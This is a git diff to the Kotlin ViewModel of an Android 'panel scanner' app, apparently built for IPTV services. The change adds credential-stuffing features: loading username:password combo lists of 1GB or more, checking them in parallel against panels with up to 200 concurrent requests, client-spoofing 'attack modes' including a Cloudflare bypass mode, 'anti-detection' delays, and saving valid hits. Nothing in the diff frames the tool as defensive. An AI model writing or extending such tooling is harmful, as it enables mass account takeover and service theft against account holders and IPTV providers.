@@ -2,6 +2,7 @@ package com.alibaba.feature.panelscan
 
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
+import com.alibaba.data.service.PanelScannerImpl
 import com.alibaba.domain.model.*
 import com.alibaba.domain.service.PanelScanner
 import dagger.hilt.android.lifecycle.HiltViewModel
@@ -12,21 +13,59 @@ import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.io.InputStream
 import javax.inject.Inject
 
+/**
+ * 🔥 ULTRA PANEL SCANNER STATE
+ * Attack modları ve gelişmiş tarama özellikleri
+ */
 data class PanelScanState(
     val comboText: String = "",
-    val customPanelUrl: String = "",  // Elle girilen panel URL
+    val customPanelUrl: String = "",
     val selectedPanels: List<PanelInfo> = emptyList(),
-    val useEmbeddedPanels: Boolean = false,  // Varsayılan kapalı - kullanıcı kendi panelini girecek
+    val useEmbeddedPanels: Boolean = false,
     val scanning: Boolean = false,
     val progress: ScanProgress? = null,
     val results: List<PanelScanResult> = emptyList(),
     val errorMessage: String? = null,
-    val comboLineCount: Int = 0,  // Yüklenen satır sayısı
-    val showSaveDialog: Boolean = false,  // Kaydetme dialogu
-    val savedFilePath: String? = null  // Kaydedilen dosya yolu
+    val comboLineCount: Int = 0,
+    val showSaveDialog: Boolean = false,
+    val savedFilePath: String? = null,
+    // 🔥 Yeni özellikler
+    val attackMode: AttackModeOption = AttackModeOption.ROTATION,
+    val scanSpeed: ScanSpeed = ScanSpeed.FAST,
+    val totalScanned: Int = 0,
+    val scanStartTime: Long = 0,
+    val estimatedTimeRemaining: String = ""
 )
+
+/**
+ * Attack modları - den.py'den alınan
+ */
+enum class AttackModeOption(val displayName: String, val description: String) {
+    ROTATION("🔄 Rotation", "Her istekte farklı mod kullanır - En güvenli"),
+    RANDOM("🎲 Random", "Rastgele User-Agent kullanır"),
+    TIVIMATE("📺 TiviMate", "TiviMate uygulaması gibi davranır"),
+    OTT_NAVIGATOR("📡 OTT Navigator", "OTT Navigator uygulaması gibi davranır"),
+    KODI("🎬 Kodi", "Kodi media player gibi davranır"),
+    XCIPTV("📱 XCIPTV", "XCIPTV uygulaması gibi davranır"),
+    STB_MAG("📦 STB/MAG", "MAG set-top box gibi davranır"),
+    SMARTERS_PRO("💫 Smarters Pro", "IPTV Smarters Pro gibi davranır"),
+    APPLE_TV("🍎 Apple TV", "Apple TV gibi davranır"),
+    CLOUDBURST("☁️ Cloudburst", "Cloudflare bypass modu")
+}
+
+/**
+ * Tarama hızı seçenekleri
+ */
+enum class ScanSpeed(val displayName: String, val delayMs: Long, val concurrency: Int) {
+    SLOW("🐢 Yavaş (Güvenli)", 500L, 10),
+    NORMAL("🚶 Normal", 200L, 25),
+    FAST("🏃 Hızlı", 100L, 50),
+    ULTRA("🚀 Ultra Hızlı", 50L, 100),
+    AGGRESSIVE("⚡ Saldırgan", 0L, 200)
+}
 
 data class ScanProgress(
     val current: Int,
@@ -34,7 +73,8 @@ data class ScanProgress(
     val currentAccount: String = "",
     val validCount: Int = 0,
     val invalidCount: Int = 0,
-    val errorCount: Int = 0
+    val errorCount: Int = 0,
+    val speedPerSecond: Float = 0f
 )
 
 @HiltViewModel
@@ -46,10 +86,82 @@ class PanelScanViewModel @Inject constructor(
     val state: StateFlow<PanelScanState> = _state.asStateFlow()
     
     private var scanJob: kotlinx.coroutines.Job? = null
+    
+    // PanelScannerImpl'e cast - gelişmiş özellikler için
+    private val advancedScanner: PanelScannerImpl? 
+        get() = panelScanner as? PanelScannerImpl
 
     fun setComboText(text: String) {
         val lineCount = text.lines().count { it.contains(":") }
         _state.update { it.copy(comboText = text, comboLineCount = lineCount) }
+    }
+    
+    /**
+     * 🔥 Streaming combo yükleme - 1GB+ dosya desteği
+     */
+    fun loadComboFromStream(inputStream: InputStream, onComplete: (Int) -> Unit = {}) {
+        viewModelScope.launch {
+            try {
+                _state.update { it.copy(errorMessage = null) }
+                
+                val scanner = advancedScanner
+                if (scanner != null) {
+                    val accounts = scanner.parseComboStream(
+                        inputStream = inputStream,
+                        onProgress = { lineCount ->
+                            _state.update { it.copy(comboLineCount = lineCount) }
+                        }
+                    )
+                    
+                    // Hesapları text olarak sakla (geriye uyumluluk için)
+                    val comboText = accounts.joinToString("\n") { "${it.username}:${it.password}" }
+                    _state.update { 
+                        it.copy(
+                            comboText = comboText,
+                            comboLineCount = accounts.size
+                        ) 
+                    }
+                    onComplete(accounts.size)
+                } else {
+                    // Fallback - normal okuma
+                    val text = inputStream.bufferedReader().use { it.readText() }
+                    setComboText(text)
+                    onComplete(_state.value.comboLineCount)
+                }
+            } catch (e: Exception) {
+                _state.update { it.copy(errorMessage = "Dosya okuma hatası: ${e.message}") }
+            }
+        }
+    }
+    
+    /**
+     * Attack modu değiştir
+     */
+    fun setAttackMode(mode: AttackModeOption) {
+        _state.update { it.copy(attackMode = mode) }
+        
+        // Scanner'a da bildir
+        advancedScanner?.setAttackMode(
+            when (mode) {
+                AttackModeOption.ROTATION -> PanelScannerImpl.AttackMode.ROTATION
+                AttackModeOption.RANDOM -> PanelScannerImpl.AttackMode.RANDOM
+                AttackModeOption.TIVIMATE -> PanelScannerImpl.AttackMode.TIVIMATE
+                AttackModeOption.OTT_NAVIGATOR -> PanelScannerImpl.AttackMode.OTT_NAVIGATOR
+                AttackModeOption.KODI -> PanelScannerImpl.AttackMode.KODI
+                AttackModeOption.XCIPTV -> PanelScannerImpl.AttackMode.XCIPTV
+                AttackModeOption.STB_MAG -> PanelScannerImpl.AttackMode.STB_MAG
+                AttackModeOption.SMARTERS_PRO -> PanelScannerImpl.AttackMode.SMARTERS_PRO
+                AttackModeOption.APPLE_TV -> PanelScannerImpl.AttackMode.APPLE_TV
+                AttackModeOption.CLOUDBURST -> PanelScannerImpl.AttackMode.CLOUDBURST
+            }
+        )
+    }
+    
+    /**
+     * Tarama hızı değiştir
+     */
+    fun setScanSpeed(speed: ScanSpeed) {
+        _state.update { it.copy(scanSpeed = speed) }
     }
     
     fun setCustomPanelUrl(url: String) {
@@ -141,6 +253,10 @@ class PanelScanViewModel @Inject constructor(
         return sb.toString()
     }
 
+    /**
+     * 🔥 ULTRA HIZLI PARALEL TARAMA
+     * Seçilen attack modu ve hız ayarlarına göre tarama yapar
+     */
     fun startScan() {
         val currentState = _state.value
         
@@ -149,7 +265,6 @@ class PanelScanViewModel @Inject constructor(
             return
         }
         
-        // Custom panel veya embedded panel kontrolü
         val hasCustomPanels = currentState.selectedPanels.isNotEmpty()
         val useEmbedded = currentState.useEmbeddedPanels
         
@@ -159,12 +274,15 @@ class PanelScanViewModel @Inject constructor(
         }
 
         scanJob = viewModelScope.launch {
+            val startTime = System.currentTimeMillis()
+            
             _state.update { 
                 it.copy(
                     scanning = true, 
                     errorMessage = null,
                     results = emptyList(),
-                    progress = null
+                    progress = null,
+                    scanStartTime = startTime
                 ) 
             }
 
@@ -205,76 +323,106 @@ class PanelScanViewModel @Inject constructor(
                     return@launch
                 }
 
-                // Calculate total scans
                 val totalScans = accounts.size * panelsToScan.size
-                var currentScan = 0
+                val results = mutableListOf<PanelScanResult>()
                 var validCount = 0
                 var invalidCount = 0
                 var errorCount = 0
-                val results = mutableListOf<PanelScanResult>()
+                val delayMs = currentState.scanSpeed.delayMs
 
-                // Scan each account on each panel
+                // 🔥 PARALEL TARAMA - Çok daha hızlı
                 withContext(Dispatchers.IO) {
-                    for (account in accounts) {
-                        for (panel in panelsToScan) {
-                            currentScan++
-                            
-                            // Update progress
-                            _state.update { 
-                                it.copy(
-                                    progress = ScanProgress(
-                                        current = currentScan,
-                                        total = totalScans,
-                                        currentAccount = "${account.username}:${account.password}",
-                                        validCount = validCount,
-                                        invalidCount = invalidCount,
-                                        errorCount = errorCount
-                                    )
-                                ) 
-                            }
-
-                            // Scan account
-                            val result = panelScanner.scanAccount(account, panel)
-                            
-                            // Update counts
-                            when (result.status) {
-                                is ScanStatus.Valid -> {
-                                    validCount++
-                                    results.add(result)
+                    val semaphore = kotlinx.coroutines.sync.Semaphore(currentState.scanSpeed.concurrency)
+                    var currentScan = 0
+                    
+                    val jobs = accounts.flatMap { account ->
+                        panelsToScan.map { panel ->
+                            async {
+                                semaphore.withPermit {
+                                    try {
+                                        val result = panelScanner.scanAccount(account, panel)
+                                        
+                                        synchronized(results) {
+                                            currentScan++
+                                            
+                                            when (result.status) {
+                                                is ScanStatus.Valid -> {
+                                                    validCount++
+                                                    results.add(result)
+                                                    // Hit bulunduğunda hemen UI'ı güncelle
+                                                    _state.update { it.copy(results = results.toList()) }
+                                                }
+                                                is ScanStatus.Invalid -> invalidCount++
+                                                is ScanStatus.Error -> errorCount++
+                                                is ScanStatus.Banned -> errorCount++
+                                                else -> {}
+                                            }
+                                            
+                                            // Her 50 taramada bir progress güncelle (performans için)
+                                            if (currentScan % 50 == 0 || currentScan == totalScans) {
+                                                val elapsed = (System.currentTimeMillis() - startTime) / 1000f
+                                                val speed = if (elapsed > 0) currentScan / elapsed else 0f
+                                                
+                                                _state.update { 
+                                                    it.copy(
+                                                        progress = ScanProgress(
+                                                            current = currentScan,
+                                                            total = totalScans,
+                                                            currentAccount = "${account.username}:***",
+                                                            validCount = validCount,
+                                                            invalidCount = invalidCount,
+                                                            errorCount = errorCount,
+                                                            speedPerSecond = speed
+                                                        ),
+                                                        totalScanned = currentScan
+                                                    ) 
+                                                }
+                                            }
+                                        }
+                                        
+                                        // Anti-detection delay
+                                        if (delayMs > 0) {
+                                            kotlinx.coroutines.delay(delayMs)
+                                        }
+                                        
+                                        result
+                                    } catch (e: Exception) {
+                                        synchronized(results) { errorCount++ }
+                                        null
+                                    }
                                 }
-                                is ScanStatus.Invalid -> invalidCount++
-                                is ScanStatus.Error -> errorCount++
-                                is ScanStatus.Banned -> errorCount++
-                                else -> {}
                             }
-
-                            // Update results if valid
-                            if (result.status is ScanStatus.Valid) {
-                                _state.update { 
-                                    it.copy(results = results.toList()) 
-                                }
-                            }
-
-                            // Small delay to prevent rate limiting
-                            kotlinx.coroutines.delay(100)
                         }
                     }
+                    
+                    jobs.awaitAll()
                 }
 
                 // Final update
+                val totalTime = (System.currentTimeMillis() - startTime) / 1000f
                 _state.update { 
                     it.copy(
                         scanning = false,
+                        showSaveDialog = results.isNotEmpty(),
                         progress = ScanProgress(
                             current = totalScans,
                             total = totalScans,
                             validCount = validCount,
                             invalidCount = invalidCount,
-                            errorCount = errorCount
+                            errorCount = errorCount,
+                            speedPerSecond = if (totalTime > 0) totalScans / totalTime else 0f
                         )
                     ) 
                 }
 
+            } catch (e: kotlinx.coroutines.CancellationException) {
+                // Kullanıcı durdurdu
+                _state.update { 
+                    it.copy(
+                        scanning = false,
+                        showSaveDialog = _state.value.results.isNotEmpty()
+                    ) 
+                }
             } catch (e: Exception) {
                 _state.update { 
                     it.copy(
